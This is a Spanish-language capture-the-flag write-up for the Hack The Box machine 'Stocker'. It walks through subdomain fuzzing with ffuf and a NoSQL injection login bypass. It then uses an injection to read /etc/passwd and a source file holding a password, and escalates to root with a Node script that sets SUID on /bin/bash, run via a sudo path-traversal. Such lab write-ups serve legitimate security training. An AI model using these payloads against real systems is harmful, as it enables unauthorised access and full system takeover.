# StockerWriteup

Realizamos un escaneo con nmap

![imagen](https://github.com/Hamibubu/StockerWriteup/assets/108554878/bb037a3a-e082-4eed-b41c-837dcb4342b1)

Vemos que esta abierto el puerto 80 y el 22, así que visitamos la página web, al entrar se autodirecciona a "stocker.htb", por lo que agregamos esto a /etc/hosts

Entramos y la página web no tiene nada, analizamos todo y parece segura, pero falta algo, como nos redireccionó, puede haber más subdominios escondidos así que usamos ffuf

![imagen](https://github.com/Hamibubu/StockerWriteup/assets/108554878/ec64b229-6b35-4126-a60f-11460dfc758f)

~~~
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://stocker.htb -H 'Host: FUZZ.stocker.htb' -mc 200,201,302
~~~

Entramos a página "dev.stocker.htb"

Vemos un login

![imagen](https://github.com/Hamibubu/StockerWriteup/assets/108554878/3879e8a6-8bd7-4a91-8998-f43add109e9b)

Calamos son SQLinjection y vemos que no funciona, calamos con noSQL

![imagen](https://github.com/Hamibubu/StockerWriteup/assets/108554878/cb650dab-77cb-48b5-8f34-6e1c210ffcf8)

Cambiamos el formato a json y ponemos la inyección en json

~~~
{"username": {"$ne": null}, "password": {"$ne": null}}
~~~

![imagen](https://github.com/Hamibubu/StockerWriteup/assets/108554878/81596dfb-faeb-449c-8b7c-f959ad43bdc6)

Y funciona, ahora vemos que hay una serie de productos, agregamos al carro y subimos la peticion

Si injecto texto en el json se queda

![imagen](https://github.com/Hamibubu/StockerWriteup/assets/108554878/f409a052-eefa-46bc-9446-e2e98b341342)

Inyectamos para que nos de el etc passw

![imagen](https://github.com/Hamibubu/StockerWriteup/assets/108554878/c6ecbefd-47cc-4818-bba0-c8361b58e035)

![imagen](https://github.com/Hamibubu/StockerWriteup/assets/108554878/2052b50d-5a9d-462b-91d3-bda194032c1d)

Sabemos que hay un user angoose

ahora podemos ver las files que hay en /var/www/dev a ver si hay algo sobre como revisa los logins

Vemos /var/www/dev/index.js y sale

![imagen](https://github.com/Hamibubu/StockerWriteup/assets/108554878/ffbbc9ba-4003-4660-93bc-024dad308e31)

Encontramos la contraseña del user

Entramos por ssh y tenemos la flag

![imagen](https://github.com/Hamibubu/StockerWriteup/assets/108554878/585d3283-4943-459b-b4a0-53ec234c8dd7)

Ahora para el root damos sudo -l

![imagen](https://github.com/Hamibubu/StockerWriteup/assets/108554878/147f198f-faef-46f9-a71e-83693257793e)

Se puede ver que el usuario puede ejecutar sudo con node en la carpeta indicada para cualquier archivo js, sin importar lo que siga por la comilla

Ahora con esto creamos un script para que nos regrese una terminal con root

~~~
const { exec } = require("child_process");

exec("chmod u+s /bin/bash", (error, stdout, stderr) => {
    if (error) {
        console.log(`error: ${error.message}`);
        return;
    }
    if (stderr) {
        console.log(`stderr: ${stderr}`);
        return;
    }
    console.log(`stdout: ${stdout}`);
});
~~~

Ahora lo ejecutamos

~~~
sudo node /usr/local/scripts/../../../home/angoose/exploit.js 
~~~

Y con esto tenemos root

![imagen](https://github.com/Hamibubu/StockerWriteup/assets/108554878/3564b50d-f820-440e-8b72-60930e438519)

Listo!
